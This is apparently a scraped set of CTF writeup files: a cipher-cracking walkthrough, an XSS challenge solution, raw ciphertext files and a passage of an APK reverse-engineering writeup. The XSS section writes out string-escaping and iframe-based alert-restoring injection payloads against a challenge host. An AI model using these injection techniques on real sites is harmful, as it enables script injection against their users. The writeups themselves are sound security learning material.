?   ? ? ? ? ? ? ? ? | 2F 68 3C 20 3A 27 3D 2F 20 66\n    160 ? ? ? ?   ? ? ?   ? | 42 09 26 2C 68 31 27 3D 68 3F\n    170 ? ? ?   ? ? ? ? ?   | 21 24 24 68 3E 21 3B 21 3C 68\n    180 ? ? ? ? ? ? ?   ? ? | 78 79 66 42 0A 3D 3C 68 3A 2D\n    190 ? ? ? ? ?   ? ? ? ? | 25 21 26 2C 64 68 3B 2B 3C 2E\n    200 ? ? ? ? ? ? ? ? ? ? | 33 1F 79 24 24 17 1D 17 7D 7F\n    210 ? ? ? ? ? ? ? ? ? ? | 79 24 24 17 2C 3D 17 7C 24 24\n    220 ? ? ? ? ? ? ? ? ? ? | 17 78 2E 17 7F 20 79 3B 17 79\n    230 ? ? ? ? ? ? ? ? ? ? | 2E 17 79 17 20 7C 2C 17 26 78\n    240 ? ? ? ? ? ? ? ? ? ? | 7F 17 3B 7C 79 2C 17 7C 26 31\n    250 ? ? ? ? ? ? ? ? ? ? | 7F 20 79 26 2F 77 35 42 42 11\n    260 ? ? ? ?   ? ? ? ? ? | 27 3D 3A 3B 68 3C 3A 3D 24 31\n    270 ? ? ? ? ?   ? ? ? ? | 64 42 1C 20 2D 68 07 3A 29 2B\n    280 ? ? ?               | 24 2D 42                     \n    Replace pos / char: char\n    Replace (charcode): 0x2D\n    With (charcode):    0x65\n    (E is the most frequent letter)\n    Current plain text:\n        0 1 2 3 4 5 6 7 8 9 |  0  1  2  3  4  5  6  7  8  9\n      0 ? e ? ?   ? ? ? ? ? | 0C 2D 29 3A 68 1C 3A 21 26 21\n     10 ? ? ? ? ? ? ? ?   ? | 3C 31 64 42 42 11 27 3D 68 3F\n     20 ? ? ?   ? e ?   ? ? | 21 24 24 68 2F 2D 3C 68 21 26\n     30   ? ? ? e   ? ? ? ? | 68 24 27 3E 2D 68 3F 21 3C 20\n     40   ? ? e   ? ? e ? ? | 68 1C 20 2D 68 07 26 2D 66 42\n     50 ? ? ?   ? ? ? ?   ? | 11 27 3D 68 3F 21 24 24 68 3B\n     60 e e   ? ? ? ?   ? ? | 2D 2D 68 3F 20 29 3C 68 26 27\n     70   ? ? ? e ?   ? ? ? | 68 27 3C 20 2D 3A 68 20 3D 25\n     80 ? ?   ? ? ? ? e   ? | 29 26 68 29 24 21 3E 2D 68 20\n     90 ? ?   ? e e ? ? ? ? | 29 3B 68 3B 2D 2D 26 66 42 11\n    100 ? ?   ? ? ? ?   ? ? | 27 3D 68 3F 21 24 24 68 3C 3A\n    110 e ? ? ? ? ?   ? ? ? | 2D 3B 38 29 3B 3B 68 2A 27 3D\n    120 ? ? ? ? ? e ?   ? ? | 26 2C 29 3A 21 2D 3B 68 26 27\n    130 ? ? ? ?   ? ? e ? ? | 2A 27 2C 31 68 2C 3A 2D 29 25\n    140 e ?   ? ?   ? ? ? ? | 2D 2C 68 27 2E 68 2F 27 21 26\n    150 ?   ? ? ? ? ? ? ? ? | 2F 68 3C 20 3A 27 3D 2F 20 66\n    160 ? ? ? ?   ? ? ?   ? | 42 09 26 2C 68 31 27 3D 68 3F\n    170 ? ? ?   ? ? ? ? ?   | 21 24 24 68 3E 21 3B 21 3C 68\n    180 ? ? ? ? ? ? ?   ? e | 78 79 66 42 0A 3D 3C 68 3A 2D\n    190 ? ? ? ? ?   ? ? ? ? | 25 21 26 2C 64 68 3B 2B 3C 2E\n    200 ? ? ? ? ? ? ? ? ? ? | 33 1F 79 24 24 17 1D 17 7D 7F\n    210 ? ? ? ? ? ? ? ? ? ? | 79 24 24 17 2C 3D 17 7C 24 24\n    220 ? ? ? ? ? ? ? ? ? ? | 17 78 2E 17 7F 20 79 3B 17 79\n    230 ? ? ? ? ? ? ? ? ? ? | 2E 17 79 17 20 7C 2C 17 26 78\n    240 ? ? ? ? ? ? ? ? ? ? | 7F 17 3B 7C 79 2C 17 7C 26 31\n    250 ? ? ? ? ? ? ? ? ? ? | 7F 20 79 26 2F 77 35 42 42 11\n    260 ? ? ? ?   ? ? ? ? ? | 27 3D 3A 3B 68 3C 3A 3D 24 31\n    270 ? ? ? ? e   ? ? ? ? | 64 42 1C 20 2D 68 07 3A 29 2B\n    280 ? e ?               | 24 2D 42                     \n    Replace pos / char: pos\n    Replace (pos):   196\n    With (charcode): 0x73\n    Replace pos / char: pos\n    Replace (pos):   197\n    With (charcode): 0x63\n    Replace pos / char: pos\n    Replace (pos):   198\n    With (charcode): 0x74\n    Replace pos / char: pos\n    Replace (pos):   199\n    With (charcode): 0x66\n    (\"sctf\" at the beginning of the flag)\n    ...\n    ...\n    ...\n    Current plain text:\n        0 1 2 3 4 5 6 7 8 9 |  0  1  2  3  4  5  6  7  8  9\n      0 ? e ? r   ? r ? ? ? | 0C 2D 29 3A 68 1C 3A 21 26 21\n     10 t ? ? ? ? ? o ?   w | 3C 31 64 42 42 11 27 3D 68 3F\n     20 ? ? ?   ? e t   ? ? | 21 24 24 68 2F 2D 3C 68 21 26\n     30   ? o ? e   w ? t h | 68 24 27 3E 2D 68 3F 21 3C 20\n     40   ? h e   ? ? e ? ? | 68 1C 20 2D 68 07 26 2D 66 42\n     50 ? o ?   w ? ? ?   s | 11 27 3D 68 3F 21 24 24 68 3B\n     60 e e   w h ? t   ? o | 2D 2D 68 3F 20 29 3C 68 26 27\n     70   o t h e r   h ? ? | 68 27 3C 20 2D 3A 68 20 3D 25\n     80 ? ?   ? ? ? ? e   h | 29 26 68 29 24 21 3E 2D 68 20\n     90 ? s   s e e ? ? ? ? | 29 3B 68 3B 2D 2D 26 66 42 11\n    100 o ?   w ? ? ?   t r | 27 3D 68 3F 21 24 24 68 3C 3A\n    110 e s ? ? s s   ? o ? | 2D 3B 38 29 3B 3B 68 2A 27 3D\n    120 ? ? ? r ? e s   ? o | 26 2C 29 3A 21 2D 3B 68 26 27\n    130 ? o ? ?   ? r e ? ? | 2A 27 2C 31 68 2C 3A 2D 29 25\n    140 e ?   o f   ? o ? ? | 2D 2C 68 27 2E 68 2F 27 21 26\n    150 ?   t h r o ? ? h ? | 2F 68 3C 20 3A 27 3D 2F 20 66\n    160 ? ? ? ?   ? o ?   w | 42 09 26 2C 68 31 27 3D 68 3F\n    170 ? ? ?   ? ? s ? t   | 21 24 24 68 3E 21 3B 21 3C 68\n    180 ? ? ? ? ? ? t   r e | 78 79 66 42 0A 3D 3C 68 3A 2D\n    190 ? ? ? ? ?   s c t f | 25 21 26 2C 64 68 3B 2B 3C 2E\n    200 ? ? ? ? ? ? ? ? ? ? | 33 1F 79 24 24 17 1D 17 7D 7F\n    210 ? ? ? ? ? ? ? ? ? ? | 79 24 24 17 2C 3D 17 7C 24 24\n    220 ? ? f ? ? h ? s ? ? | 17 78 2E 17 7F 20 79 3B 17 79\n    230 f ? ? ? h ? ? ? ? ? | 2E 17 79 17 20 7C 2C 17 26 78\n    240 ? ? s ? ? ? ? ? ? ? | 7F 17 3B 7C 79 2C 17 7C 26 31\n    250 ? h ? ? ? ? ? ? ? ? | 7F 20 79 26 2F 77 35 42 42 11\n    260 o ? r s   t r ? ? ? | 27 3D 3A 3B 68 3C 3A 3D 24 31\n    270 ? ? ? h e   ? r ? c | 64 42 1C 20 2D 68 07 3A 29 2B\n    280 ? e ?               | 24 2D 42                     \n    ...\n    ...\n    ...\n    Current plain text:\n        0 1 2 3 4 5 6 7 8 9 |  0  1  2  3  4  5  6  7  8  9\n      0 D e a r   T r i n i | 0C 2D 29 3A 68 1C 3A 21 26 21\n     10 t y , % % Y o u   w | 3C 31 64 42 42 11 27 3D 68 3F\n     20 i l l   g e t   i n | 21 24 24 68 2F 2D 3C 68 21 26\n     30   l o v e   w i t h | 68 24 27 3E 2D 68 3F 21 3C 20\n     40   T h e   O n e % % | 68 1C 20 2D 68 07 26 2D 66 42\n     50 Y o u   w i l l   s | 11 27 3D 68 3F 21 24 24 68 3B\n     60 e e   w h a t   n o | 2D 2D 68 3F 20 29 3C 68 26 27\n     70   o t h e r   h u m | 68 27 3C 20 2D 3A 68 20 3D 25\n     80 a n   a l i v e   h | 29 26 68 29 24 21 3E 2D 68 20\n     90 a s   s e e n % % Y | 29 3B 68 3B 2D 2D 26 66 42 11\n    100 o u   w i l l   t r | 27 3D 68 3F 21 24 24 68 3C 3A\n    110 e s p a s s   b o u | 2D 3B 38 29 3B 3B 68 2A 27 3D\n    120 n d a r i e s   n o | 26 2C 29 3A 21 2D 3B 68 26 27\n    130 b o d y   d r e a m | 2A 27 2C 31 68 2C 3A 2D 29 25\n    140 e d   o f   g o i n | 2D 2C 68 27 2E 68 2F 27 21 26\n    150 g   t h r o u g h % | 2F 68 3C 20 3A 27 3D 2F 20 66\n    160 % A n d   y o u   w | 42 09 26 2C 68 31 27 3D 68 3F\n    170 i l l   v i s i t   | 21 24 24 68 3E 21 3B 21 3C 68\n    180 ? ? % % B u t   r e | 78 79 66 42 0A 3D 3C 68 3A 2D\n    190 m i n d ,   s c t f | 25 21 26 2C 64 68 3B 2B 3C 2E\n    200 ? ? ? l l ? ? ? ? ? | 33 1F 79 24 24 17 1D 17 7D 7F\n    210 ? l l ? d u ? ? l l | 79 24 24 17 2C 3D 17 7C 24 24\n    220 ? ? f ? ? h ? s ? ? | 17 78 2E 17 7F 20 79 3B 17 79\n    230 f ? ? ? h ? d ? n ? | 2E 17 79 17 20 7C 2C 17 26 78\n    240 ? ? s ? ? d ? ? n y | 7F 17 3B 7C 79 2C 17 7C 26 31\n    250 ? h ? n g ? ? % % Y | 7F 20 79 26 2F 77 35 42 42 11\n    260 o u r s   t r u l y | 27 3D 3A 3B 68 3C 3A 3D 24 31\n    270 , % T h e   O r a c | 64 42 1C 20 2D 68 07 3A 29 2B\n    280 l e %               | 24 2D 42\n\nAt this point we have everything pretty much everything from the readable text, but we need to figure out the flag. `?ny?h?ng` looks like `anything`, but we already used those letters. We also used the capital A and T, so we probably need to substitute with numbers. So, eventually:\n\n    Current plain text:\n        0 1 2 3 4 5 6 7 8 9 |  0  1  2  3  4  5  6  7  8  9\n      0 D e a r   T r i n i | 0C 2D 29 3A 68 1C 3A 21 26 21\n     10 t y , % % Y o u   w | 3C 31 64 42 42 11 27 3D 68 3F\n     20 i l l   g e t   i n | 21 24 24 68 2F 2D 3C 68 21 26\n     30   l o v e   w i t h | 68 24 27 3E 2D 68 3F 21 3C 20\n     40   T h e   O n e % % | 68 1C 20 2D 68 07 26 2D 66 42\n     50 Y o u   w i l l   s | 11 27 3D 68 3F 21 24 24 68 3B\n     60 e e   w h a t   n o | 2D 2D 68 3F 20 29 3C 68 26 27\n     70   o t h e r   h u m | 68 27 3C 20 2D 3A 68 20 3D 25\n     80 a n   a l i v e   h | 29 26 68 29 24 21 3E 2D 68 20\n     90 a s   s e e n % % Y | 29 3B 68 3B 2D 2D 26 66 42 11\n    100 o u   w i l l   t r | 27 3D 68 3F 21 24 24 68 3C 3A\n    110 e s p a s s   b o u | 2D 3B 38 29 3B 3B 68 2A 27 3D\n    120 n d a r i e s   n o | 26 2C 29 3A 21 2D 3B 68 26 27\n    130 b o d y   d r e a m | 2A 27 2C 31 68 2C 3A 2D 29 25\n    140 e d   o f   g o i n | 2D 2C 68 27 2E 68 2F 27 21 26\n    150 g   t h r o u g h % | 2F 68 3C 20 3A 27 3D 2F 20 66\n    160 % A n d   y o u   w | 42 09 26 2C 68 31 27 3D 68 3F\n    170 i l l   v i s i t   | 21 24 24 68 3E 21 3B 21 3C 68\n    180 0 1 % % B u t   r e | 78 79 66 42 0A 3D 3C 68 3A 2D\n    190 m i n d ,   s c t f | 25 21 26 2C 64 68 3B 2B 3C 2E\n    200 { W 1 l l _ U _ 5 7 | 33 1F 79 24 24 17 1D 17 7D 7F\n    210 1 l l _ d u _ 4 l l | 79 24 24 17 2C 3D 17 7C 24 24\n    220 _ 0 f _ 7 h 1 s _ 1 | 17 78 2E 17 7F 20 79 3B 17 79\n    230 f _ 1 _ h 4 d _ n 0 | 2E 17 79 17 20 7C 2C 17 26 78\n    240 7 _ s 4 1 d _ 4 n y | 7F 17 3B 7C 79 2C 17 7C 26 31\n    250 7 h 1 n g ? } % % Y | 7F 20 79 26 2F 77 35 42 42 11\n    260 o u r s   t r u l y | 27 3D 3A 3B 68 3C 3A 3D 24 31\n    270 , % T h e   O r a c | 64 42 1C 20 2D 68 07 3A 29 2B\n    280 l e %               | 24 2D 42\n\nReformatted:\n\n> Dear Trinity,\n> \n> You will get in love with The One\n> \n> You will see what no other human alive has seen\n> \n> You will trespass boundaries nobody dreamed of going through\n> \n> And you will visit 01\n> \n> But remind, sctf{W1ll_U_571ll_du_4ll_0f_7h1s_1f_1_h4d_n07_s41d_4ny7h1ng?}\n> \n> Yours truly,\n> \n> The Oracle\n\n`sctf{W1ll_U_571ll_du_4ll_0f_7h1s_1f_1_h4d_n07_s41d_4ny7h1ng?}`\n\n## 51 Web / Excesss ##\n\n**Description**\n\n> This is some kind of reverse captcha to tell if the visitor is indeed a robot. Can you complete it?\n> \n> Service: http://xss1.alieni.se:2999/\n\n**No files given**\n\n**Solution**\n\nWe are presented with a simple challenge:\n\n![](screens/excesss.png)\n\nIf we follow the `?xss=hello` link, we can see this in the source code:\n\n    <script>var x ='hello'; var y = `hello`; var z = \"hello\";</script>\n\nThe `xss` parameter gets injected into three differently-quoted Javascript strings verbatim. We can use any one of them since our characters are not filtered. So, choosing the first one, we first inject a `'` to escape the string, then a `;` to allow us to run arbitrary code, and after our code, we put `//` to comment out the rest (to stop the browser from complaining about syntax errors).\n\n    ';alert(1);//\n    URL:\n    http://xss1.alieni.se:2999/?xss=%27;alert(1);//\n\nBut if we do this, we get a text prompt instead. There is another script included on the website, which overrides `window.alert`. Unfortunately, it seems `window` doesn't have a usable `prototype`, at least not in the current Chrome version. If we try `delete window.alert;`, the default `alert` function does not get restored.\n\nSearching around for how to restore overridden functions, we find a simple technique: create an `<iframe>` and use its `window`'s `alert` function.\n\n    var iframe = document.createElement(\"iframe\");\n    document.documentElement.appendChild(iframe);\n    iframe.contentWindow.alert(1);\n    URL (shorter version):\n    http://xss1.alieni.se:2999/?xss=%27;document.documentElement.appendChild(f=document.createElement(%27iframe%27));f.contentWindow.alert(1);//\n\nAnd if we submit this URL, we get the flag.\n\n`sctf{cr0ss_s1te_n0scr1ptinG}`\n", "timestamp": "2025-10-24T11:38:56.103521"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-05-31-SecurityFest/scripts/note/emsg.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-05-31-SecurityFest/scripts/note/emsg.txt", "content": "33 74 97 44 83 66 65 45 55 47 99 35 83 67 55 46 65 68 77 27 76 66 77 77 34 47 70 27 77 44 64 46 65 46 66 26 75 47 68 74 73 68 59 24 64 86 75 64 34 77 59 24 96 73 78 67 53 58 76 25 57 67 74 85 53 64 59 64 55 53 46 46 56 74 90 25 53 64 56 46 33 64 58 47 56 44 77 65 74 57 86 57 77 64 68 46 75 46 59 57 53 64 47 67 35 66 56 54 56 66 46 67 42 46 89 54 66 66 74 77 63 64 58 58 53 54 77 46 73 47 80 36 64 46 68 64 34 66 87 67 83 77 57 65 56 56 59 46 75 46 54 74 66 45 76 45 53 84 64 46 65 46 59 34 83 77 45 44 53 85 86 58 75 55 66 65 36 46 57 54 66 73 77 58 34 45 59 34 83 77 45 45 52 65 56 44 83 76 77 65 42 66 58 65 83 76 66 56 35 68 68 34 55 46 54 66 34 45 86 38 55 44 54 47 43 48 57 54 54 63 46 67 35 45 89 45 95 43 74 45 52 47 57 45 64 46 68 46 56 65 86 67 54 63 46 77 34 44 57 54 66 66 87 66 53 57 58 45 77 44 64 65 32 47 79 27 97 64 68 58 73 74 89 46 65 64 66 74 56 58 57 54 55 67 65 74 75 47 70 27 74 67 45 64 34 77 58 46 56 85 65 68 46 47 80 36 75 45 44 44 32 45 89 26 53 43 57 78 54 66 77 37 55 44 64 47 33 45 76 26 76 46 45 77 53 86 87 57 83 83 65 56 34 44 59 48 65 46 66 66 33 64 86 24 55 65 65 45 33 66 58 46 87 85 78 77 53 46 56 25 73 46 45 44 53 67 87 46 96 55 74 68 62 45 58 66 74 43 45 65 56 45 76 26 86 45 47 66 73 74 89 46 65 46 68 87 55 74 89 26 74 56 87 74 66 47 89 26 94 64 66 66 53 68 70 25 83 67 46 58 62 45 77 27 54 45 75 66 34 47 56 26 75 45 47 84 34 47 80 54 54 45 85 65 33 64 57 44 55 44 65 67 34 47 80 36 84 65 47 55 34 45 86 44 83 65 56 44 66 55 76 27 76 45 46 45 53 68 70 45 77 43 65 56 34 47 80 26 77 83 46 66 62 75 58 46 56 53 46 66 54 46 68 24 64 44 57 86 33 64 58 47 56 44 77 65 74 55 59 48 63 45 67 74 65 46 89 26 56 65 45 64 35 68 57 44 74 43 85 74 65 66 68 66 83 67 45 64 34 55 89 54 53 43 85 47 75 54 58 25 94 45 46 68 33 64 58 65 56 53 47 44 52 47 80 36 55 76 65 46 35 45 56 26 93 45 68 74 43 66 86 35 57 64 68 45 52 46 59 37 54 45 77 68 62 74 80 45 56 66 47 68 74 65 86 58 53 65 87 85 35 65 57 45 77 57 57 74 65 87 86 58 86 74 77 74 55 75 57 57 55 74 66 87 75 74 90 57 53 44 77 78 54 87 79 57 86 45 47 58 35 68\n", "timestamp": "2025-10-24T11:38:57.479693"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-05-31-SecurityFest/scripts/oracle/emsg.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-05-31-SecurityFest/scripts/oracle/emsg.txt", "content": "\f-):h\u001c:!&!<1dBB\u0011'=h?!$$h/-<h!&h$'>-h?!< h\u001c -h\u0007&-fB\u0011'=h?!$$h;--h? )<h&'h'< -:h =%)&h)$!>-h );h;--&fB\u0011'=h?!$$h<:-;8);;h*'=&,):!-;h&'*',1h,:-)%-,h'.h/'!&/h< :'=/ fB\t&,h1'=h?!$$h>!;!<hxyfB\n=<h:-%!&,dh;+<.3\u001fy$$\u0017\u001d\u0017}y$$\u0017,=\u0017|$$\u0017x.\u0017 y;\u0017y.\u0017y\u0017 |,\u0017&x\u0017;|y,\u0017|&1 y&/w5BB\u0011'=:;h<:=$1dB\u001c -h\u0007:)+$-B", "timestamp": "2025-10-24T11:38:57.954394"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-06-19-SCTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-06-19-SCTF/README.md", "content": "# 2018-06-19-SCTF #\n\n[Website](https://sctf2018.xctf.org.cn/)\n\n---\n\n## Challenges ##\n\n### Reverse ###\n\n - [x] 540 Babymips\n - [x] 392 Script In Script\n - [x] 425 Where is my 13th count?\n - [ ] 666 crackme2\n - [x] [333 simple](#333-reverse--simple)\n\n### Misc ###\n\n - [x] [46 Welcome to SCTF 2018](#46-misc--welcome-to-sctf-2018)\n - [x] [129 神奇的Modbus](#129-misc--神奇的modbus) (Magical Modbus)\n - [x] [434 神秘的交易](#434-misc--神秘的交易) (Mysterious transactions)\n - [x] [285 肥宅快乐题](#285-misc--肥宅快乐题) (Fat house happy questions)\n - [x] [357 侧信道初探](#357-misc--侧信道初探) (On the side channel)\n - [ ] 800 被动了手脚的数据 (Passive data / Data that is being tinkered with)\n - [x] [909 交易识破后的报复](#909-misc--交易识破后的报复) (Revenge after seeing the transaction)\n\n### Crypto ###\n\n - [ ] 571 ElGamal Hacker\n - [x] [465 a number problem](#465-crypto--a-number-problem)\n - [x] [144 it may contain 'flag'](#144-crypto--it-may-contain-flag)\n\n### Web ###\n\n - [ ] 625 新的建议板 (New suggestion board)\n - [ ] 800 Zhuanxv\n - [ ] 1000 NGINX的秘密 (The secret of NGINX)\n - [ ] 1000 BabySyc - Simple PHP Web\n - [ ] 1000 BabyIntranet\n - [ ] 1000 BabyIntranet2\n - [ ] 198 easiest web - phpmyadmin\n\n### Pwn ###\n\n - [ ] 769 bufoverflow_b\n - [ ] 645 bufoverflow_a\n - [ ] 625 sbbs\n - [ ] 800 WTF Game\n\n---\n\n## 333 Reverse / simple ##\n\n**No description provided**\n\n**Files provided**\n\n - [`an APK file`](files/simple.apk)\n\n**Solution**\n\nWe are given an APK file, an Android app which presumably shows a text input and a button to check the answer. I say presumably because I never actually ran the app, static analysis was enough.\n\nAny APK is actually a valid ZIP file:\n\n    $ zipinfo simple.apk\n    Archive:  738030e7-35e1-42b2-a067-6a2a55cb4866.apk   658213   29\n    -rw----     0.0 fat     1452 b- defN  0-000-80 00:00 AndroidManifest.xml\n    -rw----     2.4 fat      773 b- defN  0-000-80 00:00 META-INF/CERT.RSA\n    -rw----     2.4 fat     2998 b- defN  0-000-80 00:00 META-INF/CERT.SF\n    -rw----     2.4 fat     2936 b- defN  0-000-80 00:00 META-INF/MANIFEST.MF\n    -rw----     2.4 fat   453104 b- stor  0-000-80 00:00 assets/test.zip\n    -rw----     2.4 fat   447676 b- defN  0-000-80 00:00 classes.dex\n    -rw----     0.0 fat     5632 b- defN  0-000-80 00:00 res/drawable-anydpi-v21/ic_launcher_background.xml\n       ... a bunch of PNG files ...\n    -rw----     0.0 fat     9508 b- stor  0-000-80 00:00 resources.arsc\n    29 files, 1004837 bytes uncompressed, 652931 bytes compressed:  35.0%\n\nMost of these files are irrelevant to us, they are simply required for a proper Android app structure. The two files of interest are `assets/test.zip` and `classes.dex`. We can briefly glance at [`assets/test.zip`](scripts/simple/test.zip):\n\n    $ . xxd assets/test.zip | head\n    0000000: 504b 0304 6734 58f2 b8bd 7867 ccaf ae27  PK..g4X...xg...'\n    0000010: 7946 063e 22f1 5dbb 2272 e973 4e8d 5d4d  yF.>\".].\"r.sN.]M\n    0000020: d153 0405 abcd 872c 54bc 0ce5 fbb0 bac2  .S.....,T.......\n    0000030: a6a9 78b3 a9e7 8a33 c46b a613 6d56 8bf3  ..x....3.k..mV..\n    0000040: 4720 ff05 0405 b300 2c3c 79fa 6ac6 0075  G ......,<y.j..u\n    0000050: 316f b979 a9f5 be81 dc5a 2822 d4b4 d217  1o.y.....Z(\"....\n    0000060: f5f7 ed99 f804 0142 4363 44f9 e5dc 4fc7  .......BCcD...O.\n    0000070: 6cd3 327f 2ac7 fa38 8d86 1b38 b04b 89c7  l.2.*..8...8.K..\n    0000080: 42c3 8d65 be2c 124e 1e43 9c14 6a45 60a0  B..e.,.N.C..jE`.\n    0000090: be16 889f 74e7 8715 b158 434f 6b6d b39d  ....t....XCOkm..\n\nThe four leading bytes match those of a ZIP header, but the rest of the file is not at all ZIP-like. In particular, there is no sign of a `PK` sequence at the end of the file. Let's move on for now.\n\nAs for `classes.dex` - DEX, or [Dalvik Executable](https://source.android.com/devices/tech/dalvik/dex-format), is a format used to store the compiled Java classes for Android applications in a more space-efficient manner (among other reasons). It can be converted to a standard JAR, e.g. using [`dex2jar`](https://github.com/pxb1988/dex2jar). This would still only contain the compiled Java classes, so they would need to be decompiled into Java source code.\n\nWe can make our job easier with an [online decompiler](http://www.javadecompilers.com/), which takes the entire APK and produces reasonable (not perfect) source code from that. So, for our `simple.apk`, we get:\n\n    com.fancy.crackme1.BuildConfig\n    com.fancy.crackme1.C0006R\n    com.fancy.crackme1.FindAssetfile\n    com.fancy.crackme1.ProxyApplication\n    com.fancy.crackme1.RefInvoke\n\nLuckily most of this is irrelevant to us once again. The important information is in `ProxyApplication`:\n\n    protected void attachBaseContext(Context base) {\n        super.attachBaseContext(base);\n        String dexpath1 = getDir(\"shell\", 0) + \"/load.dex\";\n        File dexfile1 = FindAssetfile.getAssetsFile(this, \"test.zip\", dexpath1, null);\n        DexClassLoader dcl1 = new DexClassLoader(dexpath1, getDir(\"shell_oat\", 0).getAbsolutePath(), getApplicationInfo().nativeLibraryDir, getClassLoader());\n        Object currentActivityThread = RefInvoke.invokeStaticMethod(\"android.app.ActivityThread\", \"currentActivityThread\", new Class[0], new Object[0]);\n        RefInvoke.setFieldOjbect(\"android.app.LoadedApk\", \"mClassLoader\", ((WeakReference) ((ArrayMap) RefInvoke.getFieldOjbect(\"android.app.ActivityThread\", currentActivityThread, \"mPackages\")).get(getPackageName())).get(), dcl1);\n    }\n\nSo the source code we have doesn't really do anything, it just loads more Java code from the `assets/test.zip` file. It seems to mention a `load.dex` file as well, but this is not included in the application. In fact, when we inspect what `FindAssetfile` does, we can see that it decrypts the fake ZIP file into a DEX file.\n\n    public static File getAssetsFile(Context cont, String assetfile, String releasefile, Method decMethod) {\n        String key = \"E82038F4B30E810375C8365D7D2C1A3F\";\n        try {\n            byte[] dec;\n            InputStream is = cont.getAssets().open(assetfile);\n            ByteArrayOutputStream bos = new ByteArrayOutputStream();\n            byte[] buf = new byte[1024];\n            while (true) {\n                int iRead = is.read(buf);\n                if (iRead == -1) {\n                    break;\n                }\n                bos.write(buf, 0, iRead);\n            }\n            if (decMethod != null) {\n                dec = (byte[]) decMethod.invoke(null, new Object[]{bos.toByteArray()});\n            } else {\n                dec = bos.toByteArray();\n            }\n            is.close();\n            bos.close();\n            FileOutputStream outfile = new FileOutputStream(new File(releasefile));\n            dec[0] = (byte) 113;\n            dec[1] = (byte) 114;\n            dec[2] = (byte) 10;\n            dec[3] = (byte) 8;\n            outfile.write(crypt(dec, key));\n            outfile.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } catch (InvocationTargetException e2) {\n            e2.printStackTrace();\n        } catch (IllegalAccessException e3) {\n            e3.printStackTrace();\n        }\n        return null;\n    }\n    \n    public static byte[] crypt(byte[] data, String key) {\n        int i;\n        byte[] keys = key.getBytes();\n        int x = 0;\n        int[] box = new int[256];\n        for (i = 0; i < 256; i++) {\n            box[i] = i;\n        }\n        for (i = 0; i < 256; i++) {\n            x = ((box[i] + x) + keys[i % keys.length]) % 256;\n            int tmp = box[i];\n            box[i] = box[x];\n            box[x] = tmp;\n        }\n        x = 0;\n        int y = 0;\n        byte[] out = new byte[data.length];\n        int index = 0;\n        for (byte ch : data) {\n            x = (x + 1) % 256;\n            y = (box[x] + y) % 256;\n            tmp = box[y];\n            box[y] = box[x];\n            box[x] = tmp;\n            out[index] = (byte) (box[(box[x] + box[y]) % 256] ^ ch);\n            index++;\n        }\n        return out;\n    }\n\nWe can see the decryption key `E82038F4B30E810375C8365D7D2C1A3F`, as well as the fact that the first four bytes of the ZIP file are replaced with the correct ciphertext. So indeed, the first four bytes looking like a ZIP header were just a decoy.\n\nWell, the application runs this code when it is started, and we see all that it works with – we can simply execute the same code to recover the `load.dex` file.\n\n([decryption script in Haxe because I don't like Java](scripts/simple/Decode.hx))\n\nAs mentioned above, a DEX file can be decoded back into a JAR file:\n\n    $ ./d2j-dex2jar.sh load.dex\n\nAnd after decompiling the resulting JAR file, we get these classes:\n\n    com.fancy.crackme1.BuildConfig\n    com.fancy.crackme1.FindAssetfile\n    com.fancy.crackme1.MainActivity\n    com.fancy.crackme1.Point\n    com.fancy.crackme1.ProxyApplication\n    com.fancy.crackme1.R\n    com.fancy.crackme1.RefInvoke\n    com.fancy.crackme1.Square\n\nIt is interesting that it contains duplicates of the classes we already had in the APK. This time we can focus on `MainActivity`, `Point`, and `Square`. After cleaning up the code in `MainActivity` a little bit (the decompiler is not perfect), we get something like this:\n\n    protected void onCreate(Bundle paramBundle) {\n      super.onCreate(paramBundle);\n      setContentView(2131034112);\n      edt = ((EditText)findViewById(2130968582));\n      tv = ((TextView)findViewById(2130968597));\n      ((Button)findViewById(2130968578)).setOnClickListener(new View.OnClickListener() {\n        public void onClick(View paramAnonymousView) {\n          paramAnonymousView = edt.getText().toString().trim().getBytes();\n          if (paramAnonymousView.length != 24) {\n            return;\n          }\n          while ((paramAnonymousView[0] <= 48) || (paramAnonymousView[7] >= 112)) {\n            return;\n          }\n          for (int i = 0; i < 24; i += 8) {\n            Square[] arrayOfSquare = new Square[8];\n            for (int j = 0; j < 7; j++) {\n              if (paramAnonymousView[(j + i)] >= paramAnonymousView[(i + j + 1)]) {\n                return;\n              }\n              arrayOfSquare[j] = new Square((paramAnonymousView[(i + j)] << 8) + 0x315F0000 + 0xFF, i / 2 + 4);\n            }\n            arrayOfSquare[7] = new Square((paramAnonymousView[(i + 7)] << 8) + 0x315F0000 + 0xFF, i / 2 + 4);\n            for (int j = 0; j < arrayOfSquare.length; j++) {\n              if (!arrayOfSquare[j].check()) {\n                return;\n              }\n            }\n          }\n          tv.setText(\"Success!\");\n        }\n      });\n    }\n\nEven without running the app we can guess what the interface might look like. `edt` is an [`android.widget.EditText`](https://developer.android.com/reference/android/widget/EditText) view, which is an editable text field. `tv` is an [`android.widget.TextView`](https://developer.android.com/reference/android/widget/TextView), which is used for presenting (non-editable) text to the user. Finally, there is an [`android.widget.Button`](https://developer.android.com/reference/android/widget/Button) which executes a checking routine when it is clicked / tapped.\n\n`paramAnonymousView` is set to the byte values of the text the user entered into `edt`. I am not sure why the type system works here, since `getBytes()` is not a `View` value, but that is not very important to us.\n\nFirst the code checks that:\n\n - there are exactly 24 characters\n - the ASCII value of the first is at least 49\n - the ASCII value of the last is at most 111\n\nThen it iterates the 24 characters in 3 blocks of 8. Each block of 8 byte values must be strictly increasing, i.e. they are 8 distinct characters whose ASCII value is higher and higher.\n\nFor each block it creates an array of 8 `Square` instances, and passes the (slightly modified) byte data into the constructor. Then it calls the `check` method on each `Square`. If all 24 `Square`s pass their `check`, `tv` indicates a success message, presumably indicating that these 24 characters are the flag.\n\nWe can summarise what we know about the flag and how it is passed into the `Square` constructors as follows:\n\n - 24 characters long, consisting of 3 blocks of 8 characters\n - each block is strictly increasing\n - each block is bounded to the values `[49, 111]`\n   - note: only the first block is actually checked for this, but the solution assumes it holds for all three blocks\n - the following `Square`s are constructed and `check`ed:\n   - `Square((flag[ 0] << 8) + 0x315F00FF,  